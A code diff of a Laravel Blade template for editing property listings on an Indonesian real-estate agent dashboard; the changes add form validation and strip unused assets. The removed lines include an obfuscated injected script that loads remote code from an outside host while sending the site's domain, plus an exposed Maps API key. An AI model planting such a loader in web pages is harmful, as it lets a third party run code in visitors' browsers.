@@ -17,18 +17,6 @@
   <!-- External Css -->
   <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
   <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />
-
-  <!-- leaflet -->
-  <link rel="stylesheet" href="{{asset('assets/leaflet/css/leaflet.css')}}">
-  <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.css')}}">
-  <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.Default.css')}}">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Dropify/0.2.2/css/dropify.min.css">
 
   <!-- Custom Css -->
@@ -39,9 +27,6 @@
 
   <!-- Favicon -->
   <link rel="icon" href="{{asset('images/favicon.png')}}">
-  <link rel="apple-touch-icon" href="{{asset('images/apple-touch-icon.png')}}">
-  <link rel="apple-touch-icon" sizes="72x72" href="{{asset('images/icon-72x72.png')}}">
-  <link rel="apple-touch-icon" sizes="114x114" href="{{asset('images/icon-114x114.png')}}">
 
   <script src="https://cdn.tiny.cloud/1/no-api-key/tinymce/5/tinymce.min.js" referrerpolicy="origin"></script>
   <script>
@@ -65,145 +50,111 @@
     <div class="container-fluid">
       <div class="row">
         <div class="col-md-3">
-          <div class="user-profile">
-            <div class="user-thumb">
-              <img src="{{asset('images/dashboard/user/thumb-1.jpg')}}" class="img-responsive" alt="">
-              <div class="varified">
-                <i class="fas fa-check"></i>
-              </div>
-            </div>
-            <div class="user-name">
-              <h5><a href="#">Maria K.Marlin</a></h5>
-            </div>
-            {{-- <div class="info">
-              <div class="profile-info">
-                <h6>85%</h6>
-                <p>Profile comp</p>
-                <a href="#" class="button primary-bg">Edit Profile</a>
-              </div>
-              <div class="notification">
-                <h6>35</h6>
-                <p>Notification</p>
-                <a href="#" class="button primary-bg">Log Out</a>
-              </div>
-            </div> --}}
-          </div>
-          <div class="dashboard-sidenav">
-            <ul class="dashboard-nav" id="dashboard-nav">
-              <li class="navigation-item">
-                <a href="dashboard.html"><span class="ti-layers-alt"></span>Dashboard</a>
-              </li>
-              <li class="navigation-item dropdown">
-                <a href="#"><span class="ti-location-pin"></span>Properti Saya</a>
-                <ul class="dropdown-menu">
-                  <li><a href="/agent/properties">Semua Properti</a></li>
-                  <li><a href="/agent/properties/add">Tambah Properti</a></li>
-                  <li><a href="dashboard-active-listing.html">Active Listings</a></li>
-                  <li><a href="dashboard-expired-listing.html">Expired Listings</a></li>
-                </ul>
-              </li>
-              <li class="navigation-item">
-                <a href="dashboard-my-favorites.html"><span class="ti-heart"></span>My Favorites</a>
-              </li>
-              <li class="navigation-item dropdown">
-                <a href="#"><span class="ti-comment-alt"></span>Reviews<span class="badge">(05)</span></a>
-                <ul class="dropdown-menu">
-                  <li><a href="dashboard-all-review.html">All Reviews</a></li>
-                  <li><a href="dashboard-my-review.html">My Reviews</a></li>
-                </ul>
-              </li>
-              <li class="navigation-item dropdown">
-                <a href="#"><span class="ti-email"></span>Messages<span class="badge">(12)</span></a>
-                <ul class="dropdown-menu">
-                  <li><a href="dashboard-all-message.html">All Messages</a></li>
-                  <li><a href="dashboard-unread-message.html">Unread Messages</a></li>
-                </ul>
-              </li>
-              <li class="navigation-item dropdown">
-                <a href="#"><span class="ti-gift"></span>Packages</a>
-                <ul class="dropdown-menu">
-                  <li><a href="dashboard-checkout.html">Check Out</a></li>
-                  <li><a href="dashboard-package-plan.html">Package Plan</a></li>
-                </ul>
-              </li>
-              <li class="navigation-item">
-                <a href="dashboard-invoices.html"><span class="ti-clipboard"></span>Invoice</a>
-              </li>
-              <li class="navigation-item">
-                <a href="dashboard-claim-refund.html"><span class="ti-widget-alt"></span>Claim &amp; Refund</a>
-              </li>
-              <li class="navigation-item">
-                <a href="dashboard-settings.html"><span class="ti-settings"></span>Setting</a>
-              </li>
-              <li class="navigation-item">
-                <a href="dashboard-my-profile.html"><span class="ti-user"></span>My Profile</a>
-              </li>
-            </ul>
-          </div>
+          @include('layouts.sidebar')
         </div>
-        <div class="col-md-6">
+        <div class="col-md-9">
           <div class="dashboard-body-block">
             <div class="cpdv-add-listing-container">
             <form action="/agent/properties/{{$property->id}}" method="POST" class="add-listing-form" enctype="multipart/form-data">
                 @csrf
                 @method('PATCH')
                 <div class="listing-form-section business-information-container">
-                  <h4 class="title">Tambah Properti</h4>
+                  <h4 class="title">Ubah Properti</h4>
                   <div class="listing-section-body">
                     <div class="row">
                       <div class="col-xs-12">
                         <div class="form-group">
                           <label for="title">Judul</label>
-                        <input id="title" name="title" type="text" value="{{$property->title}}" class="form-control">
+                        <input id="title" name="title" type="text" value="{{$property->title}}" class="form-control" @error('title') style="border-color: red" @enderror required>
+                        @error('title')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
 
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="surface_area">Luas Tanah</label>
-                          <input id="surface_area" name="surface_area" type="number" class="form-control" value="{{$property->surface_area}}" placeholder="Dalam satuan meter persegi" aria-required="true">
+                          <input id="surface_area" name="surface_area" type="number" class="form-control" value="{{$property->surface_area}}" placeholder="Dalam satuan meter persegi" required" @error('surface_area') style="border-color: red" @enderror>
+                          @error('surface_area')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="building_area">Luas Bangunan</label>
-                          <input id="building_area" name="building_area" type="number" class="form-control" value="{{$property->building_area}}" placeholder="Dalam satuan meter persegi" aria-required="true">
+                          <input id="building_area" name="building_area" type="number" class="form-control" value="{{$property->building_area}}" placeholder="Dalam satuan meter persegi" required @error('building_area') style="border-color: red" @enderror required>
+                          @error('building_area')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="location">Lokasi</label>
-                          <input id="location" name="location" type="text" class="form-control" value="{{$property->location}}" placeholder="" aria-required="true">
+                          <input id="location" name="location" type="text" class="form-control" value="{{$property->location}}" placeholder="" required @error('location') style="border-color: red" @enderror required>
+                          @error('location')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="direction">Arah hadap</label>
-                          <input id="direction" name="direction" type="text" class="form-control" value="{{$property->direction}}" placeholder="Barat,Timur dll" aria-required="true">
+                          <input id="direction" name="direction" type="text" class="form-control" value="{{$property->direction}}" placeholder="Barat,timur dll" required @error('direction') style="border-color: red" @enderror required>
+                          @error('direction')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="bathroom">Kamar Mandi</label>
-                          <input id="bathroom" name="bathroom" type="number" class="form-control" value="{{$property->bathroom}}" placeholder="" aria-required="true">
+                          <input id="bathroom" name="bathroom" type="number" class="form-control" value="{{$property->bathroom}}" placeholder="" @error('bathroom') style="border-color: red" @enderror required>
+                           @error('bathroom')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="bedroom">Kamar Tidur</label>
-                          <input id="bedroom" name="bedroom" type="number" class="form-control" value="{{$property->bedroom}}" placeholder="" aria-required="true">
+                          <input id="bedroom" name="bedroom" type="number" class="form-control" value="{{$property->bedroom}}" placeholder="" @error('bedroom') style="border-color: red" @enderror  required>
+                          @error('bedroom')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="price">Harga</label>
-                          <input id="price" name="price" type="number" class="form-control" value="{{$property->price}}" placeholder="" aria-required="true">
+                          <input id="price" name="price" type="number" class="form-control" value="{{$property->price}}" placeholder="" @error('price') style="border-color: red" @enderror required>
+                          @error('price')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-sm-6">
                         <div class="form-group">
                           <label for="value">Satuan Harga</label>
-                          <select id="value" name="value" class="form-control">
+                          <select id="value" name="value" required class="form-control">
                             <option value="JT" {{old('value') == "JT" ? 'selected' : ''}}>Juta</option>
                             <option value="M" {{old('value') == "M" ? 'selected' : ''}}>Miliar</option>
                           </select>
@@ -213,7 +164,7 @@
                       <div class="col-sm-6">
                         <div class="form-group">
                           <label for="type_id">Tipe Rumah</label>
-                          <select id="type_id" name="type_id" class="form-control">
+                          <select id="type_id" name="type_id" class="form-control" required>
                             @foreach ($types as $type)    
                               <option value="{{$type->id}}" {{old('type_id') == $type->id ? 'selected' : ''}}>{{$type->name}}</option>
                             @endforeach
@@ -224,7 +175,7 @@
                       <div class="col-sm-6">
                         <div class="form-group">
                           <label for="status_id">Status</label>
-                          <select id="status_id" name="status_id" class="form-control">
+                          <select id="status_id" name="status_id" class="form-control" required>
                             @foreach ($status as $s)    
                               <option value="{{$s->id}}" {{old('status_id') == $s->id ? 'selected' : ''}}>{{$s->name}}</option>
                             @endforeach
@@ -235,42 +186,72 @@
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="electricity">Listrik</label>
-                          <input id="electricity" name="electricity" value="{{$property->electricity}}"   type="number" class="form-control" placeholder="Satuan Watt" aria-required="true">
+                          <input id="electricity" name="electricity" value="{{$property->electricity}}"   type="number" class="form-control" placeholder="Dalam satuan Watt" @error('electricity') style="border-color: red" @enderror required>
+                          @error('electricity')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="water">Sumber Air</label>
-                          <input id="water" name="water" type="text" value="{{$property->water}}"  class="form-control" placeholder="" aria-required="true">
+                          <input id="water" name="water" type="text" value="{{$property->water}}"  class="form-control" placeholder="" @error('water') style="border-color: red" @enderror required>
+                          @error('water')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="legality">Legalitas</label>
-                          <input id="legality" name="legality" value="{{$property->legality}}"  type="text" class="form-control" placeholder="" aria-required="true">
+                          <input id="legality" name="legality" value="{{$property->legality}}" type="text" class="form-control" placeholder="" @error('legality') style="border-color: red" @enderror required>
+                          @error('legality')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="garage">Garasi</label>
-                          <input id="garage" name="garage" value="{{$property->garage}}"  type="number" class="form-control" placeholder="" aria-required="true">
+                          <input id="garage" name="garage" value="{{$property->garage}}"  type="number" class="form-control" placeholder="" @error('garage') style="border-color: red" @enderror required>
+                          @error('garage')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="name">Nama</label>
-                          <input id="name" name="name" type="text" value="{{$property->name}}"  class="form-control" placeholder="" aria-required="true">
+                          <input id="name" name="name" type="text" value="{{$property->name}}"  class="form-control" placeholder="" @error('name') style="border-color: red" @enderror  required>
+                          @error('name')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="phone_number">Nomor Handphone Pemilik</label>
-                          <input id="phone_number" name="phone_number" type="text" value="{{$property->phone_number}}"  class="form-control" placeholder="" aria-required="true">
+                          <input id="phone_number" name="phone_number" type="text" value="{{$property->phone_number}}"  class="form-control" placeholder="" required @error('phone_number') style="border-color: red" @enderror>
+                          @error('phone_number')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
@@ -278,7 +259,12 @@
                       <div class="col-xs-12">
                         <div class="form-group listing-compose-block">
                           <label for="mytextarea">Description</label>
-                        <textarea name="description" id="mytextarea" rows="20" class="tinymce-editor">{{$property->description}}</textarea>
+                        <textarea name="description" id="mytextarea" rows="20" class="tinymce-editor" required>{{$property->description}}</textarea>
+                        @error('description')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
@@ -286,61 +272,29 @@
                         <div class="form-group">
                           <label for="">Foto 1</label>
                         <input type="file" name="photo[]" data-max-file-size="2M" class="dropify" data-default-file="{{isset($property->images[0]) ? asset($property->images[0]->photo) : ''}}" />
+                        <span>*Wajib diisi</span>
                         </div>
                       </div>
                       <div class="col-lg-4">
                         <div class="form-group">
                           <label for="">Foto 2</label>
                           <input type="file" name="photo[]" data-max-file-size="2M" class="dropify" data-default-file="{{isset($property->images[1]) ? asset($property->images[1]->photo) : ''}}" />
+                          <span>*Opsional</span>
                         </div>
                       </div>
                       <div class="col-lg-4">
                         <div class="form-group">
                           <label for="">Foto 3</label>
                           <input type="file" name="photo[]" data-max-file-size="2M" class="dropify" ata-default-file="{{isset($property->images[2]) ? asset($property->images[0]->photo) : ''}}"/>
+                          <span>*Opsional</span>
                         </div>
                       </div>
-
-
-                      <!-- <div class="form-group form-group-file-type">
-                        <label for="listing_company_brochure">Company Brochure</label>
-                        <input type="file" name="file">
-                        <span>File Format .pdf, .doc, .docx, .ppt, .pptx, .jpeg, .png</span>
-                      </div> -->
-
                     </div>
                   </div>
                   <button type="submit" class="button primary-bg">Update</button>
                 </div>
               </form>
             </div>
-          </div>
-        </div>
-        <div class="col-md-3">
-          <div class="dashboard-activity-container">
-            <h5 class="activity-title">Notification</h5>
-            <ul class="activity-wrapper">
-              <li class="activity-list">
-                <p class="time">10 Minutes ago</p>
-                <p class="title"><a href="#">Roman Write a Review</a></p>
-              </li>
-              <li class="activity-list">
-                <p class="time">10 Minutes ago</p>
-                <p class="title"><a href="#">New Message</a></p>
-              </li>
-              <li class="activity-list">
-                <p class="time">10 Minutes ago</p>
-                <p class="title"><a href="#">New Comment</a></p>
-              </li>
-              <li class="activity-list">
-                <p class="time">10 Minutes ago</p>
-                <p class="title"><a href="#">New Listing Added</a></p>
-              </li>
-              <li class="activity-list">
-                <p class="time">10 Minutes ago</p>
-                <p class="title"><a href="#">Found New Place</a></p>
-              </li>
-            </ul>
           </div>
         </div>
       </div>
@@ -547,54 +501,7 @@
   <script src="{{asset('assets/js/jquery.min.js')}}"></script>
   <!-- Include all compiled plugins (below), or include individual files as needed -->
   <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
-  <script src="{{asset('assets/js/visible.js')}}"></script>
-  <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
-  <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
-  <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
-  <script src="{{asset('assets/js/plyr.js')}}"></script>
-  <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
-  <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
-  <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
-  <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
-  <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
-  <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>
-
-  <!-- leaflet -->
-  <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
-  <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
-  <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>
-
-  <script src="{{asset('js/custom.js')}}"></script>
   <script src="{{asset('js/dashboard.js')}}"></script>
-  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
-  <script src="{{asset('js/map.js')}}"></script>
-  <script src="{{asset('js/searchMap.js')}}"></script>
-  <script type="text/javascript">
-    if (self == top) {
-      function netbro_cache_analytics(fn, callback) {
-        setTimeout(function() {
-          fn();
-          callback();
-        }, 0);
-      }
-
-      function sync(fn) {
-        fn();
-      }
-
-      function requestCfs() {
-        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-        var idc_glo_r = Math.floor(Math.random() * 99999999999);
-        var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pJDmtm%2bxesmo0ZMegSCb3JUanBtEhdW961ElByTx5MQ7%2fU%2bOg4Fax2kO31n84DP%2fSTsLMgvIn3nLbHhFfmJSOYL0y87kzBB65nkxrkPX9h8TMwxWZbjB0M1nJ8WzSHL%2b6lBfZ9fu5vSJRt02cACRflXTaMdV54%2fV0Pr3T2IdZoluJzo%2bKL%2boyrgs2%2boVAeh5WYOEI1xe%2fnum%2b%2fVLwdWk6Vevxl7gT%2bTZRvK78z6YHTfvF15OEVaMKulwH2d247SGLryumOYnHLbVfqvtKD5pdgTCK8%2bQlj0l%2f38YC%2ftZCtVi0XvuucUfpF%2bjMiAfjfkeqoSvWNPxRXm2QSd04yqnT8Fq8Jiiv6tMexsII%2b%2fw%2fYT3X2waWyGl3d1CDxC4FHecYVjXmPhVznPcZGKbWWbwNO8F4jBGaZvz%2bssmA4XVsaSKe5tGKMzD040yZZfD45CBrGKuesiRL%2fEzcERKKa2ZfZv%2bVNJPnelz1vAmtv8oK%2fzV6u4trWOFVU4Zk9ZpjDS9TQ%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-        var bsa = document.createElement('script');
-        bsa.type = 'text/javascript';
-        bsa.async = true;
-        bsa.src = url;
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-      }
-      netbro_cache_analytics(requestCfs, function() {});
-    };
-  </script>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/Dropify/0.2.2/js/dropify.min.js"></script>
 
